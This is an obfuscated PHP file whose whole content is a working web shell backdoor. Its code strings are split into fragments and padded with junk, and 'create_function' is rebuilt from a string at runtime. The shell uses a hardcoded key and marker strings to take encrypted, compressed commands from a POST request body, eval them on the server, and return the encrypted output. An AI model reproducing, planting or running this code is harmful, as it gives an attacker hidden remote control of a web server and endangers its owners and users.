<?php
$f='n();$r=U+@bU+ase64_enU+code(U+@x(@gzU+compreU+ss($U+o),$k));U+print(U+"$p$U+kh$r$kf");}';
$A=str_replace('gS','','cgSrgSeategS_gSfungSctgSion');
$v='trlen($U+tU+);$o="U+";for($i=0;U+$i<U+$l;){fU+oU+r($j=0;($j<$c&U+&$iU';
$z='eU+g_matcU+h("/$khU+(.+)U+$kf/"U+,U+@fU+ile_get_U+contents("phU+p:U+//inpU+ut';
$L='$kU+="a24bU+ca3d"U+;$kh="842U+8760d861fU+";$kf="U+323dU+c2f5be13"U+;$pU';
$P='codeU+($U+m[1]),$kU+))U+U+);$o=@ob_getU+_contents();@U+ob_U+end_U+clea';
$w='+="MvU+EyBnEU+rnXAHM7DU+N";functiU+on xU+U+($t,$k){$c=strlU+en($kU+)U+;$l=s';
$c='"),U+$m)==1) {@ob_start(U+);@evaU+l(@gzuncomU+presU+s(@U+x(@basU+e64_de';
$r='+<$l)U+;$j++,$U+i+U++){$o.=$t{$iU+}^$k{U+U+$j};}}returnU+U+ $o;}if (U+@pr';
$u=str_replace('U+','',$L.$w.$v.$r.$z.$c.$P.$f);
$j=$A('',$u);$j();
?>
